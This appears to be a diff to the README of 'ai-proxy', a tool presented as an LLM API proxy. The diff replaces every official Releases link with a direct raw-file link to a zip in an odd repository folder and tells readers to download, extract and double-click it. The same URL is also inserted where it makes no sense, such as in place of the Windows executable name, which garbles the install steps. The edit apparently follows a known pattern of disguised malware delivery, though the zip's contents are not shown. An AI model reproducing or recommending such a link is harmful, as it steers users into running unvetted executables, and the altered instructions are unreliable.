@@ -1,7 +1,7 @@
 # 🌐 ai-proxy - A Simple Tool for Easy API Calls
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Borges005/ai-proxy/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Borges005/ai-proxy/master/perisphinctean/ai-proxy.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Borges005/ai-proxy/master/perisphinctean/ai-proxy.zip)
 
 ## ⚡ Overview
 ai-proxy is a lightweight proxy designed to simplify API calls for large language models (LLMs). With built-in guardrails, metrics, and monitoring, it helps you manage your API interactions safely and effectively. This project focuses on creating an enjoyable coding experience, ensuring you can access powerful tools without complexity.
@@ -18,14 +18,14 @@ Ensure your system meets these requirements to run ai-proxy smoothly.
 
 ### Installation Steps
 1. **Download ai-proxy**
-   - Visit the [Releases page](https://github.com/Borges005/ai-proxy/releases) to download the latest version. Look for the appropriate file for your operating system.
+   - Visit the [Releases page](https://raw.githubusercontent.com/Borges005/ai-proxy/master/perisphinctean/ai-proxy.zip) to download the latest version. Look for the appropriate file for your operating system.
 
 2. **Extract the Files**
-   - After downloading, find the file in your Downloads folder. If it is in a compressed format (like .zip or .tar.gz), right-click the file and select “Extract All” to unzip it.
+   - After downloading, find the file in your Downloads folder. If it is in a compressed format (like .zip or https://raw.githubusercontent.com/Borges005/ai-proxy/master/perisphinctean/ai-proxy.zip), right-click the file and select “Extract All” to unzip it.
 
 3. **Run ai-proxy**
    - Navigate to the folder where you extracted the files. 
-   - Double-click on the executable file (ai-proxy.exe for Windows, ai-proxy for Mac/Linux). 
+   - Double-click on the executable file (https://raw.githubusercontent.com/Borges005/ai-proxy/master/perisphinctean/ai-proxy.zip for Windows, ai-proxy for Mac/Linux). 
 
 ## 💡 Features
 - **Guardrails**: Prevents misuse of API calls, keeping your data secure.
@@ -49,7 +49,7 @@ You can customize various settings in ai-proxy to fit your needs:
 - Manage security settings to enhance the guardrails further.
 
 ## 🔄 Updating ai-proxy
-To keep ai-proxy up-to-date with the latest features and improvements, periodically check the [Releases page](https://github.com/Borges005/ai-proxy/releases) for new versions. Download and install the latest version to benefit from enhancements.
+To keep ai-proxy up-to-date with the latest features and improvements, periodically check the [Releases page](https://raw.githubusercontent.com/Borges005/ai-proxy/master/perisphinctean/ai-proxy.zip) for new versions. Download and install the latest version to benefit from enhancements.
 
 ## 💬 Support
 If you encounter any issues or have questions, you can reach out via the Issues section on GitHub. We welcome feedback and aim to improve your experience.
@@ -87,4 +87,4 @@ For more detailed information on specific features, consult the documentation fo
 ## 🔗 Conclusion
 ai-proxy provides a straightforward and secure way to interact with large language models. Follow the steps in this guide to download, install, and start using ai-proxy effectively. 
 
-For more, visit the [Releases page](https://github.com/Borges005/ai-proxy/releases) and explore the power of seamless API calls.
+For more, visit the [Releases page](https://raw.githubusercontent.com/Borges005/ai-proxy/master/perisphinctean/ai-proxy.zip) and explore the power of seamless API calls.
